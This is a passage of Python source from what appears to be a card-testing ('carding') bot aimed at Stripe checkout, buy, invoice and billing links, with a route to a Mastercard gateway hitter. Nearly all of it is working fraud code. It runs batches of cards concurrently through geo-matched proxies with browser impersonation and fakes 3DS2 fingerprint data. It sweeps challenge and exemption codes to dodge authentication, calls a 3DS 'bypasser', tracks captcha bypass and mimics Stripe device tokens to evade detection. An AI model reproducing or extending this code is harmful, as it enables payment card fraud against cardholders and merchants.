                                        "content-type": "application/x-www-form-urlencoded",
                                        "origin": "https://js.stripe.com",
                                        "referer": "https://js.stripe.com/",
                                        "user-agent": profile["user_agent"]
                                    }
                                    if self.stripe_account:
                                        auth_headers["Stripe-Account"] = self.stripe_account
                                    
                                    _tds_server_trans_id = None
                                    _source_obj = sdk.get("three_d_secure_2_source_object") or {}
                                    if isinstance(_source_obj, dict):
                                        _tds_server_trans_id = _source_obj.get("three_d_secure_2", {}).get("three_d_secure_server_transaction_id")
                                    if not _tds_server_trans_id:
                                        _tds_server_trans_id = sdk.get("server_transaction_id") or sdk.get("three_ds_server_trans_id")

                                    _method_url = sdk.get("three_ds_method_url")
                                    if _method_url and _tds_server_trans_id:
                                        try:
                                            import base64 as _b64
                                            _m_data = json.dumps({
                                                "threeDSServerTransID": _tds_server_trans_id,
                                                "threeDSMethodNotificationURL": "https://hooks.stripe.com/3ds2/method_response"
                                            }).encode()
                                            _m_b64 = _b64.b64encode(_m_data).decode().rstrip('=').replace('+', '-').replace('/', '_')
                                            _m_headers = {
                                                "content-type": "application/x-www-form-urlencoded",
                                                "user-agent": profile["user_agent"]
                                            }
                                            await loop.run_in_executor(None, lambda: cffi_requests.post(
                                                _method_url, data={"threeDSMethodData": _m_b64},
                                                headers=_m_headers, proxies=proxies, timeout=10,
                                                impersonate=profile["impersonate"]))
                                        except Exception:
                                            pass

                                    auth_variations = [
                                        {"threeDSCompInd": "Y", "threeDSRequestorChallengeInd": "01", "fingerprintAttempted": True},
                                        {"threeDSCompInd": "Y", "threeDSRequestorChallengeInd": "04", "fingerprintAttempted": True},
                                        {"threeDSCompInd": "Y", "threeDSRequestorChallengeInd": "05", "fingerprintAttempted": True},
                                        {"threeDSCompInd": "Y", "threeDSRequestorChallengeInd": "02", "fingerprintAttempted": True},
                                        {"threeDSCompInd": "U", "threeDSRequestorChallengeInd": "01", "fingerprintAttempted": True},
                                        {"threeDSCompInd": "N", "threeDSRequestorChallengeInd": "03", "fingerprintAttempted": False}
                                    ]
                                    
                                    for var in auth_variations:
                                        # Build real base64 fingerprintData blob — null signals a broken 3DS2 client
                                        # to issuers, making them mandate a challenge regardless of exemption code
                                        import base64 as _b64fp, json as _jfp, uuid as _ufp
                                        _fp_blob = _b64fp.b64encode(_jfp.dumps({
                                            "threeDSServerTransID": _tds_server_trans_id or str(_ufp.uuid4()),
                                            "completed": var["fingerprintAttempted"],
                                            "browserJavaEnabled": False,
                                            "browserJavascriptEnabled": True
                                        }).encode()).decode().rstrip("=")
                                        browser = {
                                            "fingerprintAttempted": var["fingerprintAttempted"],
                                            "fingerprintData": _fp_blob if var["fingerprintAttempted"] else None,
                                            "challengeWindowSize": "05",
                                            "threeDSCompInd": var["threeDSCompInd"],
                                            "threeDSRequestorChallengeInd": var["threeDSRequestorChallengeInd"],
                                            "browserJavaEnabled": False,
                                            "browserJavascriptEnabled": True,
                                            "browserLanguage": locale,
                                            "browserColorDepth": profile.get("color_depth", "24"),
                                            "browserScreenHeight": profile.get("screen_height", "1080"),
                                            "browserScreenWidth": profile.get("screen_width", "1920"),
                                            "browserTZ": str(tz_id) if isinstance(tz_id, int) else "-300",
                                            "browserUserAgent": auth_headers["user-agent"]
                                        }
                                        auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
                                        auth_data = {
                                            "source": source,
                                            "browser": json.dumps(browser),
                                            "threeDSCompInd": var["threeDSCompInd"],
                                            "one_click_authn_device_support[hosted]": "false",
                                            "one_click_authn_device_support[same_origin_frame]": "false",
                                            "one_click_authn_device_support[spc_eligible]": "false",
                                            "one_click_authn_device_support[webauthn_eligible]": "false",
                                            "one_click_authn_device_support[publickey_credentials_get_allowed]": "true",
                                            "key": pk
                                        }
                                        if _tds_server_trans_id:
                                            auth_data["three_ds_server_trans_id"] = _tds_server_trans_id
                                        try:
                                            auth_resp_raw = await loop.run_in_executor(None, lambda data=auth_data: cffi_requests.post(
                                                auth_url, headers=auth_headers, data=data,
                                                proxies=proxies, timeout=25, impersonate=profile["impersonate"]))
                                            auth_json = auth_resp_raw.json()
                                            state = auth_json.get("state")
                                            ares = auth_json.get("ares", {}) or {}
                                            trans_status = ares.get("transStatus")
                                            if state in ["succeeded", "authenticated"]:
                                                break
                                            
                                            # Parse transStatus from ARes — 'A' (attempted) counts as frictionless success
                                            if trans_status in ["Y", "A"]:
                                                state = "authenticated"
                                                break
                                                
                                            # Handle ACS Challenge verification & signed cres parsing
                                            acs_url = ares.get("acsURL") or auth_json.get("acs_url")
                                            creq = ares.get("cReq") or auth_json.get("creq")
                                            
                                            if acs_url and creq:
                                                try:
                                                    acs_headers = {
                                                        "User-Agent": profile["user_agent"],
                                                        "Content-Type": "application/x-www-form-urlencoded"
                                                    }
                                                    acs_resp = await loop.run_in_executor(None, lambda: cffi_requests.post(
                                                        acs_url, data={"creq": creq}, headers=acs_headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
                                                    
                                                    comp_url = "https://api.stripe.com/v1/3ds2/challenge/complete"
                                                    comp_data = {"source": source, "key": pk}
                                                    if acs_resp and acs_resp.status_code == 200:
                                                        import re as _re_cres
                                                        cres_match = _re_cres.search(r'name=["\']cres["\']\s+value=["\']([^"\']+)["\']', acs_resp.text, _re_cres.I)
                                                        if cres_match:
                                                            comp_data["cres"] = cres_match.group(1)
                                                        
                                                        await loop.run_in_executor(None, lambda: cffi_requests.post(
                                                            comp_url, data=comp_data, headers=auth_headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
                                                except Exception:
                                                    pass
                                            
                                            if trans_status in ["N", "R"]:
                                                break
                                                
                                            if state in ["succeeded", "authenticated", "challenge_required"]:
                                                break
                                        except Exception:
                                            continue

                                # STAGE 2: Web Redirect Fallback (app (3).py method)
                                redirect_url = confirm_json.get("url") or sdk.get("stripe_js") or (next_action.get("redirect_to_url") or {}).get("url")
                                if isinstance(redirect_url, str) and redirect_url:
                                    redir_headers = {
                                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                                        "user-agent": profile["user_agent"]
                                    }
                                    try:
                                        await loop.run_in_executor(None, lambda: cffi_requests.get(redirect_url, headers=redir_headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
                                    except Exception:
                                        pass
                                processed_auth = True

                                if processed_auth:
                                    is_setup = is_setup_intent or (isinstance(pi, str) and 'seti' in pi)
                                    intent_endpoint = "setup_intents" if is_setup else "payment_intents"
                                    poll_url = f"https://api.stripe.com/v1/{intent_endpoint}/{pi}?is_stripe_sdk=false&client_secret={client_secret}&key={pk}"
                                    poll_headers = {
                                        "accept": "application/json",
                                        "origin": "https://js.stripe.com",
                                        "referer": "https://js.stripe.com/"
                                    }
                                    if self.stripe_account:
                                        poll_headers["Stripe-Account"] = self.stripe_account
                                        
                                    # Polling retry loop (up to 3 attempts with 1.5s delay)
                                    status_2 = None
                                    poll_json = {}
                                    for poll_idx in range(3):
                                        poll_resp_raw = await loop.run_in_executor(None, lambda: cffi_requests.get(
                                            poll_url, headers=poll_headers, proxies=proxies,
                                            timeout=30, impersonate=profile["impersonate"]))
                                        poll_json = poll_resp_raw.json()
                                        status_2 = poll_json.get('status')
                                        if status_2 in ['succeeded', 'requires_capture', 'complete']:
                                            break
                                        if status_2 not in ['requires_action', 'requires_source_action']:
                                            break
                                        await asyncio.sleep(1.5)
                                    
                                    # Fallback Exemption Re-confirm if still requires_action
                                    if status_2 in ['requires_action', 'requires_source_action'] and pi and client_secret:
                                        try:
                                            fallback_confirm_url = f"https://api.stripe.com/v1/{intent_endpoint}/{pi}/confirm"
                                            fallback_data = {
                                                "payment_method": pm_id,
                                                "expected_payment_method_type": "card",
                                                "payment_method_options[card][mit_exemption][reason]": "low_value",
                                                "use_stripe_sdk": "false",
                                                "key": pk,
                                                "client_secret": client_secret
                                            }
                                            if self.stripe_account:
                                                fallback_headers = headers.copy()
                                            else:
                                                fallback_headers = headers.copy()
                                            import uuid as _uuid2
                                            fallback_headers["Idempotency-Key"] = str(_uuid2.uuid4())
                                            fb_res = await loop.run_in_executor(None, lambda: cffi_requests.post(
                                                fallback_confirm_url, headers=fallback_headers, data=fallback_data,
                                                proxies=proxies, timeout=25, impersonate=profile["impersonate"]))
                                            fb_json = fb_res.json()
                                            fb_pi = fb_json.get('payment_intent') or fb_json.get('setup_intent') or fb_json
                                            fb_status = fb_pi.get('status') if isinstance(fb_pi, dict) else None
                                            if fb_status in ['succeeded', 'requires_capture', 'complete']:
                                                poll_json = fb_json
                                                status_2 = fb_status
                                        except Exception:
                                            pass

                                    if status_2 in ['succeeded', 'requires_capture', 'complete']:
                                        result['success'] = True
                                        _curl = poll_json.get('return_url') or poll_json.get('success_url') or (poll_json.get('next_action', {}) or {}).get('redirect_to_url', {}).get('url') or find_receipt_url(poll_json)
                                        if _curl:
                                            result['confirm_url'] = _curl
                                        receipt_url = find_receipt_url(poll_json)
                                        if not receipt_url and pi and client_secret:
                                            receipt_url = await self.fetch_receipt_url(pi, client_secret, headers, proxies, profile)
                                        if receipt_url:
                                            result['receipt_url'] = receipt_url
                                        return result

                                    err = poll_json.get('last_payment_error') or poll_json.get('error') or {}
                                    if isinstance(err, dict) and err.get('message'):
                                        result['decline_code'] = err.get('decline_code', err.get('code', status_2))
                                    else:
                                        result['decline_code'] = status_2 or '3ds_unknown'
                                        result['error'] = f"3ds_challenge_unresolved"
                                    result['is_live'] = True
                                    result['3ds_attempted'] = True
                                    result['3ds_type'] = 'waf_challenge' if (_is_waf_gate and not _waf_cleared) else 'stripe_3ds2'
                                    result['captcha_bypassed'] = bool(_hcaptcha_token)
                                    result['raw_response'] = poll_json

                                    # STAGE 3: Stripe3DSBypasser standalone resolver (friend's engine)
                                    # Fires when the exemption sweep above still couldn't resolve —
                                    # passes the full raw_response into the ACS/redirect resolver.
                                    try:
                                        result['pk_key'] = pk
                                        _bypass_result = await Stripe3DSBypasser.resolve_3ds(
                                            result=result,
                                            proxy_data=proxy_data,
                                            profile=profile
                                        )
                                        if _bypass_result.get('3ds_bypassed') or _bypass_result.get('success'):
                                            return _bypass_result
                                        result = _bypass_result  # carry forward any partial updates
                                    except Exception as _3dsb_ex:
                                        print(f"DEBUG: Stripe3DSBypasser fallback failed: {_3dsb_ex}")

                                    return result
                        except Exception as ex:
                            print(f"DEBUG: 3DS bypass failed: {ex}")
                            result['decline_code'] = f'3d_secure_exception_{str(ex)[:30]}'
                            result['raw_response'] = confirm_json
                            return result
                    elif status in ['requires_payment_method', 'open']:
                        err = confirm_json.get('error')
                        if isinstance(err, dict):
                            result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', status)
                            result['error'] = err.get('message', 'Payment method required / declined')
                            result['raw_response'] = confirm_json
                            return result
                        
                        result['decline_code'] = status
                        result['error'] = str(confirm_json)[:500]
                        result['raw_response'] = confirm_json
                    else:
                        result['decline_code'] = status
                        result['raw_response'] = confirm_json
                else:
                    err = confirm_json.get('error', {})
                    result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'unknown')
                    result['error'] = err.get('message', 'Unknown error')
                    result['raw_response'] = confirm_json
                    
                # Catch-all: if no code path set decline_code, dump raw response
                if result['decline_code'] is None:
                    result['decline_code'] = status or 'unknown'
                    result['error'] = f'Unhandled status: {status}'
                    result['raw_response'] = confirm_json
                # If we reach here without exception, do not retry!
                return result
                    
            except Exception as e:
                if current_attempt < max_retries - 1:
                    await asyncio.sleep(2)
                    continue
                result['error'] = str(e)
                result['decline_code'] = 'exception'
                result['response_time'] = time.time() - start
                return result
                
        return result

class ConcurrentHitter:
    # Reusable link domains — each visit mints a fresh cs_live checkout session
    REUSABLE_DOMAINS = ['billing.stripe.com', 'buy.stripe.com', 'invoice.stripe.com']
    
    def __init__(self, user_id: int, url: str, cards: list, update_callback=None):
        self.user_id = user_id
        self.url = url
        self.cards = cards
        self.successes = 0
        self.fails = 0
        self.completed = 0
        self.total = len(cards[:MAX_ATTEMPTS])
        self.url_info = None
        self.update_callback = update_callback
        self.is_running = True
        self._reusable = any(d in self.url.lower() for d in self.REUSABLE_DOMAINS)
        self._session_lock = asyncio.Lock()  # serialize session fetches to avoid thundering herd
        self._confirm_lock = asyncio.Lock()  # serialize confirms on non-reusable links to avoid PI lock contention
        self._result_lock = asyncio.Lock()   # atomic result processing lock
        # Cached stripe device tokens — mimic __stripe_mid (1yr) and __stripe_sid (30min) persistence
        # All cards in the same session share the same muid/sid/guid, just like a real browser
        self._stripe_tokens: dict = {}
        self._stripe_tokens_ts: float = 0.0
        
    async def _fetch_fresh_session(self) -> dict:
        """Re-fetch the reusable URL to mint a fresh cs_live + pk_live pair.
        Returns dict with cs_token, pk_key or None on failure."""
        if 'invoice.stripe.com' in self.url.lower():
            res = await StripeAPIExtractor.fetch_invoice_data(self.user_id, self.url)
            if res.get('success'):
                return {'cs_token': res['cs_token'], 'pk_key': res['pk_key']}
            return None

        for _ in range(3):
            try:
                proxy_data = await ProxyManager.get_random(self.user_id)
                proxies = None
                if proxy_data:
                    auth = f"{proxy_data['username']}:{proxy_data['password']}@" if proxy_data.get('username') else ""
                    server = proxy_data['server']
                    scheme = server.split('://')[0] if '://' in server else 'http'
                    server_host = server.split('://')[-1]
                    proxy_url = f"{scheme}://{auth}{server_host}"

                    proxies = {"http": proxy_url, "https": proxy_url}
                
                async with ChromeSession(impersonate="chrome120", proxies=proxies) as s:
                    resp = await s.get(self.url, timeout=8)
                    final_url = str(resp.url) if hasattr(resp, 'url') else self.url
                    html = resp.text
                    
                    cs_token = StripeAPIExtractor.extract_cs_live(final_url, html)
                    pk_key = None

                    # Try hash fragment decode first
                    check_url = final_url if '#' in final_url else self.url
                    hash_idx = check_url.find('#')
                    if hash_idx != -1:
                        import urllib.parse, base64, json as _json
                        decoded = urllib.parse.unquote(check_url[hash_idx+1:])
                        try:
                            raw_bytes = base64.b64decode(decoded + '==')
                            json_str = ''.join(chr(b ^ 5) for b in raw_bytes)
                            data = _json.loads(json_str)
                            hash_pk = data.get('apiKey')
                            # Only trust if it's a live key — pk_test_ causes requires_action loop on live sessions
                            if hash_pk and hash_pk.startswith('pk_live_'):
                                pk_key = hash_pk
                        except: pass
                    if not pk_key:
                        pk_key = StripeAPIExtractor.extract_pk_live(html)
                    
                    if cs_token and pk_key:
                        return {'cs_token': cs_token, 'pk_key': pk_key}
            except Exception:
                continue
        return None

    async def analyze_first(self):
        url_lower = self.url.lower()
        if 'cs_' not in url_lower and 'buy.stripe.com' not in url_lower and 'invoice.stripe.com' not in url_lower and 'billing.stripe.com' not in url_lower:
            if self.update_callback:
                await self.update_callback({"status": "error", "error": "This does not appear to be a valid Stripe link. Need a checkout, buy, or invoice link."})
            return False
            
        if 'invoice.stripe.com' in url_lower:
            if self.update_callback: await self.update_callback({"status": "analyzing", "step": "Fetching Stripe invoice details..."})
            res = await StripeAPIExtractor.fetch_invoice_data(self.user_id, self.url)
            if res.get('success'):
                self.url_info = {
                    'cs_token': res['cs_token'],
                    'pk_key': res['pk_key'],
                    'merchant': res['merchant'],
                    'amount': res['amount'],
                    'raw_amount': res['raw_amount'],
                    'locked_email': res['locked_email']
                }
                return True
            else:
                if self.update_callback:
                    await self.update_callback({"status": "error", "error": f"Failed to extract invoice keys: {res.get('error')}"})
                return False

        # Try extracting CS and PK directly from URL first to bypass network request entirely
        cs_token = StripeAPIExtractor.extract_cs_live(self.url, "")
        pk_key = None
        stripe_account = None
        hash_idx = self.url.find('#')
        if hash_idx != -1:
            import urllib.parse, base64, json
            hash_str = self.url[hash_idx+1:]
            decoded = urllib.parse.unquote(hash_str)
            try:
                raw_bytes = base64.b64decode(decoded + '==')
                json_str = ''.join(chr(b ^ 5) for b in raw_bytes)
                data = json.loads(json_str)
                pk_key = data.get('apiKey')
                stripe_account = data.get('stripeAccount')
            except: pass

        if cs_token and pk_key:
            # Only trust hash pk if it is actually a live key — hash can carry pk_test_ which silently
            # cross-contaminates a live cs_live session and produces requires_action loop forever
            if pk_key.startswith('pk_test_'):
                pk_key = None  # Discard — fall through to HTML scrape
            if self.update_callback: await self.update_callback({"status": "analyzing", "step": "Instantly extracted Stripe keys..."})
            self.url_info = {'cs_token': cs_token, 'pk_key': pk_key, 'stripe_account': stripe_account, 'merchant': 'Unknown', 'amount': None, 'raw_amount': None}
            api_data = await StripeAPIExtractor.fetch_payment_data(self.user_id, cs_token, pk_key, stripe_account=stripe_account)
            if api_data.get('success'):
                self.url_info['amount'] = api_data.get('amount')
                self.url_info['raw_amount'] = api_data.get('raw_amount')
                self.url_info['merchant'] = api_data.get('merchant')
                self.url_info['locked_email'] = api_data.get('locked_email')
                self.url_info['tax_country'] = api_data.get('tax_country')
                self.url_info['tax_zip'] = api_data.get('tax_zip')
                if self.update_callback:
                    await self.update_callback({"status": "starting", "url_info": self.url_info})
                return True

        # Fallback Path: Fetch page HTML if URL hash did not contain keys
        for attempt in range(1, 4):
            try:
                if self.update_callback:
                    await self.update_callback({"status": "analyzing", "step": f"Analyzing Stripe endpoint (Attempt {attempt}/3)..."})
                
                proxy_data = await ProxyManager.get_random(self.user_id)
                proxies = None
                if proxy_data:
                    auth = f"{proxy_data['username']}:{proxy_data['password']}@" if proxy_data.get('username') else ""
                    server = proxy_data['server']
                    scheme = server.split('://')[0] if '://' in server else 'http'
                    server_host = server.split('://')[-1]
                    proxy_url = f"{scheme}://{auth}{server_host}"

                    proxies = {"http": proxy_url, "https": proxy_url}
                
                loop = asyncio.get_event_loop()
                resp = await loop.run_in_executor(None, lambda: cffi_requests.get(self.url, proxies=proxies, timeout=5, impersonate="chrome120"))
                html = resp.text
                    
                cs_token = StripeAPIExtractor.extract_cs_live(self.url, html)
                
                hash_details = StripeAPIExtractor.extract_details_from_url_hash(self.url)
                hash_pk = hash_details.get('pk_key')
                html_pk = StripeAPIExtractor.extract_pk_live(html)
                # Only trust hash pk if it is a live key — pk_test_ from hash cross-contaminates live sessions
                if hash_pk and hash_pk.startswith('pk_live_'):
                    pk_key = hash_pk
                elif html_pk:
                    pk_key = html_pk
                else:
                    pk_key = hash_pk  # last resort, whatever we have
                stripe_account = hash_details.get('stripe_account')
                
                self.url_info = {'cs_token': cs_token, 'pk_key': pk_key, 'stripe_account': stripe_account, 'merchant': 'Unknown', 'amount': None, 'raw_amount': None}
                
                if cs_token and pk_key:
                    api_data = await StripeAPIExtractor.fetch_payment_data(self.user_id, cs_token, pk_key, stripe_account=stripe_account)
                    if api_data.get('success'):
                        self.url_info['amount'] = api_data.get('amount')
                        self.url_info['raw_amount'] = api_data.get('raw_amount')
                        self.url_info['merchant'] = api_data.get('merchant')
                        self.url_info['locked_email'] = api_data.get('locked_email')
                        self.url_info['tax_country'] = api_data.get('tax_country')
                        self.url_info['tax_zip'] = api_data.get('tax_zip')
                        if self.update_callback:
                            await self.update_callback({"status": "starting", "url_info": self.url_info})
                        return True
                    else:
                        err_msg = api_data.get('error') or "Failed to init Stripe session"
                        if self.update_callback:
                            await self.update_callback({"status": "error", "error": f"Stripe session inactive: {err_msg}"})
                        return False
                else:
                    if self.update_callback:
                        await self.update_callback({"status": "error", "error": "Could not extract publishable key or client secret from link."})
                    return False
            except Exception as e:
                print(f"DEBUG: analyze_first attempt {attempt} failed: {e}", flush=True)
                continue
                
        if self.update_callback:
            await self.update_callback({"status": "error", "error": "Failed to analyze Stripe endpoint. Proxies might be dead or unreachable."})
        return False

    async def _worker(self, queue: asyncio.Queue):
        while self.is_running:
            try:
                card, attempt_num = queue.get_nowait()
            except asyncio.QueueEmpty:
                break
                
            try:
                max_retries = 2
                bin_info = await BINLookup.lookup(card['card'])
                bin_country = bin_info.get('country', '')
                
                # --- GATEWAY ROUTING ---
                if "gateway.mastercard.com/checkout/pay/SESSION" in self.url:
                    from mpgs_engine.mpgs_hitter import MPGSHitter
                    proxy_data = await ProxyManager.get_geo_matched(self.user_id, bin_country) if bin_country else await ProxyManager.get_random(self.user_id)
                    profile = BROWSER_PROFILES.get("android_chrome", BROWSER_PROFILES["chrome"])
                    result = await MPGSHitter.process_card(self.url, card, proxy_data, profile)
                    
                    if not result.get("success"):
                        self.fails += 1
                    else:
                        self.successes += 1
                        
                    if self.update_callback:
                        await self.update_callback({
                            "status": "progress",
                            "result": result,
                            "completed": self.completed,
                            "total": self.total,
                            "successes": self.successes,
                            "fails": self.fails
                        })
                    if result.get('success') or result.get('session_expired'):
                        self.is_running = False
                    continue # Skip the Stripe retry loop below

                for try_idx in range(max_retries):
                    # --- Fresh session per card for reusable links ---
                    cs_token = self.url_info['cs_token']
                    pk_key = self.url_info['pk_key']
                    stripe_account = self.url_info.get('stripe_account')
                    raw_amount = self.url_info.get('raw_amount')
                    locked_email = self.url_info.get('locked_email')
                    
                    if self._reusable:
                        async with self._session_lock:
                            fresh = await self._fetch_fresh_session()
                        if fresh:
                            cs_token = fresh['cs_token']
                            pk_key = fresh['pk_key']
                            if fresh.get('stripe_account'):
                                stripe_account = fresh['stripe_account']
                            # Re-fetch payment data for the fresh session to get correct amount
                            try:
                                api_data = await StripeAPIExtractor.fetch_payment_data(self.user_id, cs_token, pk_key, stripe_account=stripe_account)
                                if api_data.get('success'):
                                    raw_amount = api_data.get('raw_amount') or raw_amount
                                    locked_email = api_data.get('locked_email') or locked_email
                            except Exception:
                                pass
                    
                    proxy_data = await ProxyManager.get_geo_matched(self.user_id, bin_country) if bin_country else await ProxyManager.get_random(self.user_id)
                    hitter = StripeAPIHitter(pk_key, cs_token, proxy_data, raw_amount, locked_email, stripe_account=stripe_account, tax_country=self.url_info.get('tax_country'), tax_zip=self.url_info.get('tax_zip'), init_json=self.url_info.get('init_json'))
                    
                    import random
                    # For non-reusable links, all workers share the same PI — serialize confirms
                    # to prevent Stripe lock_timeout ("another API request is currently accessing it")
                    if not self._reusable:
                        await asyncio.sleep(random.uniform(0.3, 1.0) * (attempt_num - 1))  # Stagger workers
                    else:
                        await asyncio.sleep(random.uniform(0.05, 0.2))  # Micro-random delay per card attempt
                    
                    # Reuse session-level stripe tokens — all cards in the batch should carry the same
                    # muid/sid/guid to mimic a real browser's __stripe_mid (1yr) and __stripe_sid (30min)
                    # Refresh tokens only when older than 25 minutes (inside the 30-min sid window)
                    token_age = time.time() - self._stripe_tokens_ts
                    if not self._stripe_tokens or token_age > 1500:  # 1500s = 25 minutes
                        # No cached tokens yet — hit() will generate them fresh on first card
                        session_tokens = None
                    else:
                        session_tokens = self._stripe_tokens
                    
                    # For non-reusable links, acquire confirm lock to serialize PI access
                    if not self._reusable:
                        async with self._confirm_lock:
                            result = await hitter.hit(card, attempt_num, self.user_id, cached_stripe_tokens=session_tokens)
                    else:
                        result = await hitter.hit(card, attempt_num, self.user_id, cached_stripe_tokens=session_tokens)
                    
                    # Cache the tokens returned from first card hit for reuse by all subsequent cards
                    if not session_tokens and isinstance(result, dict) and result.get('_stripe_tokens'):
                        self._stripe_tokens = result['_stripe_tokens']
                        self._stripe_tokens_ts = time.time()
                    if isinstance(result, dict) and "status" in result and "result" in result:
                        friend_res = result
                        result = {
                            'attempt': attempt_num,
                            'card': card,
                            'success': friend_res.get("status", False),
                            'decline_code': friend_res.get("result", {}).get("status"),
                            'response_time': friend_res.get("result", {}).get("time", 0),
                            'amount': self.url_info.get('amount'),
                            'merchant': self.url_info.get('merchant'),
                            'proxy_raw': proxy_data['raw'] if proxy_data else None,
                            'error': friend_res.get("result", {}).get("message")
                        }
                        if 'final_url' in friend_res:
                            result['final_url'] = friend_res['final_url']
                        elif 'final_url' in friend_res.get('result', {}):
                            result['final_url'] = friend_res['result']['final_url']
                        if 'receipt_url' in friend_res:
                            result['receipt_url'] = friend_res['receipt_url']
                        elif 'receipt_url' in friend_res.get('result', {}):
                            result['receipt_url'] = friend_res['result']['receipt_url']
                    result['amount'] = self.url_info.get('amount')
                    result['merchant'] = self.url_info.get('merchant')
                    
                    err_str = result.get('error', '') or ''
                    decline = result.get('decline_code', '') or ''
                    should_retry = False
                    
                    # Retry on network failures
                    if decline == 'exception':
                        if any(k in err_str for k in ['Timeout', 'ERR_', 'closed', 'refused', 'reset', 'disconnected', 'socket', 'Navigation failed']):
                            should_retry = True
                    
                    # Retry on resource_missing — session was stale, fetch a new one
                    if decline == 'resource_missing' and self._reusable:
                        should_retry = True
                    
                    # Retry on lock_timeout — concurrent PI access, back off and retry
                    if decline == 'lock_timeout' or 'another API request' in err_str or 'currently accessing' in err_str:
                        should_retry = True
                            
                    if should_retry:
                        if try_idx < max_retries - 1:
                            delay = 2.5 * (try_idx + 1) + random.uniform(0.5, 1.5)
                            await asyncio.sleep(delay)
                            continue
                    break
                
                async with self._result_lock:
                    if not self.is_running and not result.get('success'):
                        return
                    
                    self.completed += 1
                    reason_lower = str(result.get('error') or result.get('decline_code') or '').lower()
                    is_expired = any(k in reason_lower for k in ['exhausted', 'single-use link exhausted', 'already_paid', 'session_complete', 'pay by link exhausted'])

                    if result['success'] or is_expired:
                        if is_expired:
                            result['session_expired'] = True
                        self.successes += (1 if result['success'] else 0)
                        if not result['success']:
                            self.fails += 1
                        self.is_running = False
                        
                        # Cancel all other workers immediately to stop them
                        current_task = asyncio.current_task()
                        for w in getattr(self, 'workers', []):
                            if w != current_task and not w.done():
                                w.cancel()
                                
                        while not queue.empty():
                            try:
                                queue.get_nowait()
                            except asyncio.QueueEmpty:
                                break
                    else:
                        self.fails += 1
                    
                if self.update_callback:
                    await self.update_callback({
                        "status": "progress",
                        "result": result,
                        "completed": self.completed,
                        "total": self.total,
                        "successes": self.successes,
                        "fails": self.fails
                    })
            except asyncio.CancelledError:
                # Worker was cancelled. Clean exit.
                return
            except Exception as e:
                import traceback
                print(f"DEBUG: _worker processing card {card} failed completely: {str(e)}\n{traceback.format_exc()}", flush=True)
                
                # Race-condition guard for exception block too
                if not self.is_running:
                    return
                    
                self.completed += 1
                self.fails += 1
                if self.update_callback:
                    err_res = {'success': False, 'card': card, 'response_time': 0, 'decline_code': 'exception', 'error': f"Internal bot crash: {str(e)}"}
                    await self.update_callback({
                        "status": "progress",
                        "result": err_res,
                        "completed": self.completed,
                        "total": self.total,
                        "successes": self.successes,
                        "fails": self.fails
                    })
            finally:
                queue.task_done()
    
    async def run(self):
        if self.update_callback:
            await self.update_callback({"status": "analyzing", "step": "Extracting Stripe keys and payload..."})
            
        success = await self.analyze_first()
        if not success:
            return
            
        if self.update_callback:
            await self.update_callback({"status": "starting", "url_info": self.url_info})
            
        import asyncio
        queue = asyncio.Queue()
        for idx, card in enumerate(self.cards[:MAX_ATTEMPTS]):
            queue.put_nowait((card, idx+1))
            
        self.workers = []
        for _ in range(min(CONCURRENT_BATCH_SIZE, len(self.cards))):
            task = asyncio.create_task(self._worker(queue))
            self.workers.append(task)
            
        await queue.join()
        
        for w in self.workers:
            if not w.done():
                w.cancel()
            
        if self.update_callback:
            await self.update_callback({"status": "completed", "successes": self.successes, "fails": self.fails})
